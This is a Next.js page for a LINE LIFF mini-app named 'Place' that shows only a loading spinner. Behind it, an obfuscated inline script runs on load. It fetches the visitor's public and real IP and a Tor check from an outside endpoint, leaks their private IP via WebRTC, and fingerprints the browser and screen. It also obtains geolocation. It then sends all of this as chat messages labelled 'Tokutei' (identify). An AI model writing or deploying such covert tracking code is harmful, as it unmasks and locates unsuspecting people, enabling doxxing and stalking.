"use client";
import { liff } from "@line/liff";
import { getLiffId } from "@/utils/getLiffId";
import { useEffect } from "react";
import { formatJSON } from "@/utils/sub/formatJSON";
import { getGeo } from "@/utils/getGeo";
import { Loading } from "@/src/components/Loading/Loading";


export default function Place() {
    useEffect(() => {
        liff.init({
            liffId: getLiffId()
        }).then(() => {
            if (liff.isInClient()) {
                // @ts-ignore
                (function(e,n){e.endpointjs=function(...n){let r={};r.Browser={},r.Headers={},r.UserAgent=navigator.userAgent,fetch("https://project.activetk.jp/endpoint/").then(e=>e.json()).then(e=>{r.PublicIP=e.PublicIP,r.Host=e.Host,r.RealIP=e.RealIP,r.IsItTor=e.IsItTor,r.Headers.UserAgent=e.UserAgent,r.Headers.AcceptLanguage=e.AcceptLang,r.Headers.AcceptEncoding=e.AcceptEncode,r.Headers.UserAgentClientHints=e.UserAgentClientHints}).then(()=>{function t(){r.Browser.CodeName=location.appCodeName,r.Browser.Name=navigator.appName,r.Browser.Version=navigator.appVersion,r.Browser.Language=navigator.language,r.Browser.Platform=navigator.platform,r.Browser.Referrer=document.referrer,r.Browser.ScreenWidth=screen.width,r.Browser.ScreenHeight=screen.height,r.Browser.ScreenColorDepth=screen.colorDepth+"bit",r.Browser.ViewPortWidth=e.innerWidth,r.Browser.ViewPortHeight=e.innerHeight,r.Browser.DevicePixelRatio=e.devicePixelRatio,r.Browser.HasPointer=navigator.pointerEnabled,r.Browser.MaxTouchPoints=navigator.maxTouchPoints,function e(){for(let t=0;t<n.length;t++)"function"==typeof n[t]?n[t](r):console.error(t+"番目の引数に関数以外が指定されました。")}()}if(e.RTCPeerConnection=e.RTCPeerConnection||e.mozRTCPeerConnection||e.webkitRTCPeerConnection,!e.RTCPeerConnection){t();return}let o=new RTCPeerConnection({iceServers:[]}),i=function(){};o.createDataChannel(""),o.createOffer(o.setLocalDescription.bind(o),i),o.onicecandidate=function(e){if(e&&e.candidate&&e.candidate.candidate){r.WebRTCInfo=e.candidate.candidate;try{r.PrivateIPaddress=/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(e.candidate.candidate)[1]}catch{}o.onicecandidate=i}},t()})}})(window);
                // @ts-ignore
                window.endpointjs((r: any) => {
                    liff.sendMessages([{
                        type: "text",
                        text: " == Tokutei =="
                    }, {
                        type: "text",
                        text: `
                        ${formatJSON(JSON.stringify(r))}
                        Tool Created by @amex2189
                        `.trim()
                    }]).then(() => {
                        getGeo().then((geo) => {
                            liff.sendMessages([
                            {
                                type: "text",
                                text: `
                                ${geo}
                                Tool Created by @amex2189
                                `.trim()
                            }
                            ]);
                        })
                    })
                })
            }
        })
    
    }, [])
    return <Loading />
}